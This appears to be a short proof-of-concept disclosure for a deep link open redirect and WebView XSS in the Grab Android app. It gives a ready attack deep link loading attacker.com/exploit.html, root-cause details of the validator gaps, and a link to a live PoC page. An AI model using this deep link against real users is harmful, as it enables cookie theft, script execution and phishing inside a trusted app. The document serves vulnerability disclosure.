# Grab Android WebView Injection PoC

**Vulnerability:** Deep Link Open Redirect + WebView XSS in Grab Android App

## Attack Vector

```
grab://open?screenType=WEBVIEW&page=https://attacker.com/exploit.html
```

## Impact
- Open Redirect to arbitrary HTTPS URL
- JavaScript execution in WebView context
- Storage/Cookie access
- Phishing within trusted app context

## Root Cause
1. `DeeplinkValidator.restrictMode = false`
2. WEBVIEW screenType NOT in restricted whitelist
3. Validation only checks `page` param starts with `https://`
4. No domain whitelist on redirect URL
5. `PublicWebViewActivity` loads URL with JS + DomStorage enabled

## PoC Live
https://ardiansahmotorejo130296-web.github.io/grab-webview-poc/
